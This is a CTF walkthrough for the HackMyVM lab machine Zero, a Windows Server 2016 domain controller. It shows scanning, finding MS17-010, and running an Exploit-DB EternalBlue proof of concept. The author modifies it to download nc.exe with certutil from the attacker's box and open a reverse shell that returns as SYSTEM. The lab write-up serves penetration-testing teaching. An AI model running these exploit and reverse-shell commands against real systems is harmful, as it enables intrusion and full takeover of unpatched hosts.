---
title: CTF Walkthrough for HackMyVM Machine Zero
date: 2024-10-25 00:00:00 +0300
category: [Walkthrough, CTF, CVE]
tags: [HackMyVM, Writeup]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-10-25-zero/box-zero.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Zero a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Zero<br>
Goal: Get two flags<br>
OS: Linux<br>
Download link: [Zero](https://downloads.hackmyvm.eu/zero.zip)<br>
### Tools used
1) fping<br>
2) Nmap<br>
3) CrackMapExec<br>
   
## Reconnaissance

First of all, we need to identify our target on the network. We do this by performing a host discovery scan on the current subnet.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Zero/Scans/Service]
└─$ fping -aqg 10.0.2.16/24
<SNIP>
10.0.2.15
10.0.2.16
```


After we have obtained the IP address of our target, we can perform a service scan to identify running services on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Zero/Scans/Service]
└─$ nmap -Pn -sC -sV -n 10.0.2.15 -oN service-scan.nmap                     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 23:04 BST
Nmap scan report for 10.0.2.15
Host is up (0.00090s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-25 08:04:28Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ZERO)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 12h19m57s, deviation: 4h02m29s, median: 9h59m57s
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:c0:ce:33 (Oracle VirtualBox virtual NIC)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2024-10-25T08:04:29
|_  start_date: 2024-10-25T08:02:46
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: DC01
|   NetBIOS computer name: DC01\x00
|   Domain name: zero.hmv
|   Forest name: zero.hmv
|   FQDN: DC01.zero.hmv
|_  System time: 2024-10-25T01:04:29-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.02 seconds
```

We can see the domain name and the hostname of the target in Nmap's scan. Let's add this to our `/etc/hosts` file.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Zero/Scans/Service]
└─$ echo "10.0.2.15\tDC01.zero.hmv  zero.hmv" | sudo tee -a /etc/hosts
10.0.2.15       DC01.zero.hmv  zero.hmv
```

The scan esult reveals that the target is a Windows Server 2016 domain controller. We can validate the server version using CrackMapExec.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Zero/Scans/Service]
└─$ crackmapexec smb DC01.zero.hmv                       
SMB         DC01.zero.hmv   445    DC01             [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC01) (domain:zero.hmv) (signing:True) (SMBv1:True)
```

CrackMapExec shows that this server is indeed a Windows Server 2016 and that it uses version 1 of the SMB protocol. This version is known to be vulnerable to many vulnerabilities. We can scan this host for these vulnerabilities using Nmap.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Zero/Scans/Service]
└─$ nmap DC01.zero.hmv  -Pn --script 'smb-vuln-*'
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 23:17 BST
Nmap scan report for DC01.zero.hmv (10.0.2.15)
Host is up (0.00074s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 10.42 seconds
```

Nmap's scan reveals that this host is to the ms17-010 vulnerability.

## Exploitation

We can use `searchsploit` to look for POCs of this vulnerability on our system.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Zero/Misc File]
└─$ searchsploit ms17-010                                                 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)                                                       | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                                                                                   | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                                                | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                            | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                                      | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                                                                                   | windows_x86-64/remote/41987.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Zero/Misc File]
└─$ cp /usr/share/exploitdb/exploits/windows/remote/42315.py poc.py 
```

This POC requires some external Python2 libraries to work so let's set up a virtual environment and install these libraries.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Zero/Misc File]
└─$ virtualenv --python /usr/bin/python2  env
/usr/lib/python3/dist-packages/setuptools/_distutils/cmd.py:66: SetuptoolsDeprecationWarning: setup.py install is deprecated.
<SNIP>
    added seed packages: pip==20.2.3, setuptools==44.1.1, wheel==0.35.1
  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Zero/Misc File]
└─$ source env/bin/activate

┌──(env)─(pentester㉿kali)-[~/Desktop/HackMyVM/Zero/Misc File]
└─$ pip install impacket==0.9.20
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please <SNIP>

┌──(env)─(pentester㉿kali)-[~/Desktop/HackMyVM/Zero/Misc File]
└─$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/42315.py
<SNIP>
2024-10-25 00:10:31 (61.5 MB/s) - ‘42315.py’ saved [16669/16669]

┌──(env)─(pentester㉿kali)-[~/Desktop/HackMyVM/Zero/Misc File]
└─$ mv 42315.py mysmb.py
```

This POC allows us to execute commands on the target system. So we can modify it to download a payload from our attack box and execute it. We can download `nc.exe` on the target and use it to send a reverse shell to our target. First, let's start a Python server that will host `nc.exe`.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Zero/Misc File]
└─$ cp /opt/windows/nc64.exe nc.exe     

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Zero/Misc File]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
```

We can now modify the code by uncommenting the line that calls the `service_exec()` function and adding the command that will download `nc.exe` on the target and the one that will send us a reverse shell.
```python
def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()

        print('creating file c:\\pwned.txt on the target')
        tid2 = smbConn.connectTree('C$')
        fid2 = smbConn.createFile(tid2, '/pwned.txt')
        smbConn.closeFile(tid2, fid2)
        smbConn.disconnectTree(tid2)

        #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
        service_exec(conn, r'cmd /c certutil -urlcache -split -f  http://10.0.2.16:8000/nc.exe c:\\nc.exe')
        service_exec(conn, r'cmd /c c:\\nc.exe -e cmd 10.0.2.16 1234')
        # Note: there are many methods to get shell over SMB admin session
        # a simple method to get shell (but easily to be detected by AV) is
        # executing binary generated by "msfvenom -f exe-service ..."
```

Now, we can start a listener on our attack host.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Zero/Misc File/AutoBlue-MS17-010]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

After starting the listener we can execute the Python script.
```bash
┌──(env)─(pentester㉿kali)-[~/Desktop/HackMyVM/Zero/Misc File]
└─$ python poc.py 10.0.2.15
<SNIP>
```

When we return to our listener, we will notice a reverse connection from the target. This is a shell as the NT Authority/SYSTEM user. We can use this access to read both flags on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Zero/Misc File/AutoBlue-MS17-010]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.0.2.16] from (UNKNOWN) [10.0.2.15] 49891
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
C:\Windows\system32>dir C:\Users
dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is E4E7-1761

 Directory of C:\Users

04/15/2024  07:34 AM    <DIR>          .
04/15/2024  07:34 AM    <DIR>          ..
04/15/2024  07:04 AM    <DIR>          Administrator
04/15/2024  07:04 AM    <DIR>          Public
04/15/2024  07:34 AM    <DIR>          ruycr4ft
               0 File(s)              0 bytes
               5 Dir(s)  20,872,392,704 bytes free

C:\Windows\system32>dir C:\Users\Administrator\Desktop
dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is E4E7-1761

 Directory of C:\Users\Administrator\Desktop

04/15/2024  07:32 AM    <DIR>          .
04/15/2024  07:32 AM    <DIR>          ..
04/15/2024  07:32 AM                76 root.txt
               1 File(s)             76 bytes
               2 Dir(s)  20,872,392,704 bytes free

C:\Windows\system32>dir C:\Users\ruycr4ft\Desktop
dir C:\Users\ruycr4ft\Desktop
 Volume in drive C has no label.
 Volume Serial Number is E4E7-1761

 Directory of C:\Users\ruycr4ft\Desktop

04/15/2024  07:34 AM    <DIR>          .
04/15/2024  07:34 AM    <DIR>          ..
04/15/2024  07:34 AM                58 user.txt
               1 File(s)             58 bytes
               2 Dir(s)  20,872,392,704 bytes free

C:\Windows\system32>
```
## Conclusion

Congratulations! In this walkthrough, you have exploited CVE-2017-0143 to compromise a Windows domain controller. This machine was designed to show how improper update practices of computers in a network could seriously affect the security posture of an organisation. Thank you for following up on this walkthrough.
